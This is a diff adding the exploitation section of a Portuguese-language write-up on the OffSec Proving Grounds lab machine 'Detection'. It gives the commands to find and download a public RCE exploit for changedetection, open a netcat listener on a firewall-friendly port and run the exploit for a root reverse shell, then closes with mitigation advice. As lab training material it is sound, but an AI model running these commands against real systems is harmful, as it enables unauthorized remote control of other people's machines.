@@ -53,6 +53,104 @@ Ao acessar a porta **5000** via navegador, digitando o endereço `http://192.168
 
 A presença do **changedetection** na porta 5000 é interessante e pode oferecer uma superfície de ataque que merece ser explorada. A próxima etapa envolverá a análise da aplicação para identificar potenciais vulnerabilidades que possam ser exploradas para obter acesso ao sistema.
 
+## Exploitation
+
+### Exploração da Aplicação Changedetection
+
+Com o nome da aplicação **changedetection** identificado, utilizamos o **SearchSploit**, uma ferramenta disponível no Kali Linux, para verificar se existe algum exploit conhecido disponível.
+
+O comando utilizado foi:
+
+```
+searchsploit changedetection
+```
+![image](https://github.com/user-attachments/assets/948f77d9-fc64-49b3-9392-f69a847ba64a)
+
+### Encontrando e Baixando um Exploit RCE
+
+Durante a busca, encontramos um **Remote Code Execution (RCE)** exploit disponível para a aplicação changedetection. Decidimos baixar o exploit para nossa máquina utilizando o comando:
+
+```
+searchsploit -m multiple/webapps/52027.py
+```
+
+Este comando copia o exploit para o diretório atual, permitindo que ele seja modificado ou executado conforme necessário.
+
+### Preparando o Ambiente para Execução do Exploit
+
+Para executar o exploit, primeiro precisamos instalar a biblioteca **pwn** necessária para a execução correta do script. A instalação pode ser feita com o comando:
+
+```
+pip3 install pwn
+```
+
+### Configurando o Listener
+
+Antes de executar o exploit, é importante configurar um listener em nossa máquina para capturar a conexão reversa. Como portas como **443** e **53** geralmente estão abertas em firewalls, são recomendadas para serem usadas como listeners. Outras portas, como **4444**, podem estar bloqueadas.
+
+Para configurar o listener, utilizamos o comando **netcat**:
+
+```
+nc -nlvp 443
+```
+
+### Executando o Exploit
+
+Com o listener ativo, estamos prontos para executar o exploit e obter acesso ao sistema. O comando para executar o exploit é:
+
+```
+python3 52027.py --url http://192.168.246.97:5000/ --port 443 --ip 192.168.45.213
+```
+
+- **--url**: O URL da aplicação changedetection na porta 5000.
+- **--port**: A porta que configuramos para o listener (neste caso, 443).
+- **--ip**: O endereço IP da nossa máquina atacante.
+
+Se o exploit for bem-sucedido, ele irá conectar de volta ao nosso listener, proporcionando acesso ao sistema alvo através de uma shell remota.
+
+![image](https://github.com/user-attachments/assets/dfb929be-1c93-44f6-b063-553c728540f2)
+
+### Acesso à Máquina com Privilégios de Root
+
+Com a execução bem-sucedida do exploit, conseguimos obter uma reverse shell na máquina alvo com privilégios de **root**. Isso nos proporciona controle total sobre o sistema, permitindo a exploração completa e a captura das flags necessárias.
+
+#### Capturando as Flags
+
+Com o acesso root, o próximo passo é procurar e capturar as flags. Em muitas máquinas, você encontrará dois arquivos de flag:
+
+- **local.txt**: Geralmente encontrado no diretório do usuário ou em um local específico.
+- **proof.txt**: Frequentemente localizado em um diretório de sistema ou na área de trabalho do usuário root.
+
+Em algumas máquinas, apenas o **proof.txt** estará presente. Portanto, é essencial verificar ambos os locais para garantir que todas as flags sejam capturadas.
+
+### Resumo do que Aconteceu
+
+Neste writeup, abordamos a exploração de uma máquina Linux no **OffSec Proving Grounds** chamada **Detection**. Através de uma série de etapas bem planejadas, conseguimos mapear portas abertas, identificar a aplicação changedetection, e utilizar um exploit RCE disponível no **SearchSploit** para obter uma reverse shell com privilégios de root.
+
+Os principais pontos abordados foram:
+
+1. **Enumeração Detalhada**: Usando Nmap e nmapAutomator para identificar portas e serviços em execução.
+2. **Busca por Exploits**: Utilizando SearchSploit para encontrar um exploit conhecido para a aplicação changedetection.
+3. **Execução do Exploit**: Configuração do ambiente e execução de um exploit RCE para obter acesso root na máquina alvo.
+4. **Captura de Flags**: Uma vez com acesso root, capturamos as flags locais e de proof.
+
+### Mitigação: Como Proteger-se contra Explorações Semelhantes
+
+Para evitar que vulnerabilidades semelhantes sejam exploradas, é importante seguir as melhores práticas de segurança. Aqui estão algumas medidas de mitigação que podem ser implementadas:
+
+1. **Manter Softwares Atualizados**: Certifique-se de que todas as aplicações, especialmente aquelas expostas à internet, estejam atualizadas com os últimos patches de segurança. Vulnerabilidades conhecidas frequentemente são exploradas quando não corrigidas.
+
+2. **Restringir o Acesso a Portas Sensíveis**: Limite o acesso a portas não padrão, como a porta 5000 usada pela aplicação changedetection, configurando firewalls para permitir o acesso apenas a partir de IPs confiáveis.
+
+3. **Implementar Autenticação Forte**: Sempre use autenticação forte e, se possível, implemente autenticação multifatorial (MFA) para acessar aplicações críticas.
+
+4. **Revisar Configurações de Segurança**: Realize auditorias regulares das configurações de segurança para identificar e corrigir configurações fracas ou inadequadas.
+
+5. **Monitoramento Contínuo**: Utilize ferramentas de monitoramento e detecção de intrusões (IDS) para identificar atividades suspeitas ou incomuns no sistema.
+
+6. **Segregação de Privilégios**: Limite os privilégios concedidos aos serviços e aplicações para minimizar o impacto de uma possível exploração. Serviços não devem rodar com privilégios de root, a menos que absolutamente necessário.
+
+Implementando essas medidas, você pode reduzir significativamente o risco de exploração em seus sistemas, protegendo-se contra ataques semelhantes ao que foi demonstrado neste writeup.
 
 
 
